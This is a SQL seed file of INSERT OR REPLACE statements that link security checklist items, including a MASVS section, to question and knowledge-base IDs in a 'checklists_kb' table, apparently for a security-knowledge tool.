INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.6', 3, 0, 96, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.6', 4, 0, 96, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.6', 5, 0, 96, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.10', 6, 0, 46, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.11', 7, 0, 11, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.12', 8, 0, 4, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.13', 9, 0, 173, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.14', 10, 0, 183, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.15', 11, 0, 3, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.16', 12, 0, 147, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.17', 3, 0, 71, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.17', 4, 0, 71, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.17', 5, 0, 71, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.7', 0, 1, 184, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.18', 3, 0, 166, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.18', 4, 0, 166, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.18', 5, 0, 166, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.19', 0, 0, 167, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.20', 3, 0, 234, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.20', 4, 0, 234, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.20', 5, 0, 234, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.21', 3, 0, 202, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.21', 4, 0, 202, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.21', 5, 0, 202, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.22', 13, 0, 180, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.23', 11, 0, 189, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.24', 11, 0, 179, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.25', 14, 0, 181, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.26', 15, 0, 249, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.8', 0, 1, 206, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.2', 17, 0, 149, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.6', 1, 0, 118, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.6', 2, 0, 118, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.6', 16, 0, 118, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.7', 17, 0, 119, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.8', 17, 0, 141, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.9', 17, 0, 121, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.11', 17, 0, 196, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.12', 17, 0, 207, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.13', 17, 0, 203, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.14', 17, 0, 204, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.15', 1, 0, 205, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.15', 2, 0, 205, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.15', 16, 0, 205, 0, 0, 0, 0, 'False', 'False');
--
--MASVS
--
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.9', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.10', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.11', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.12', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.13', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.9', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.10', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.11', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.12', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('3.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.9', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('4.10', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('5.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
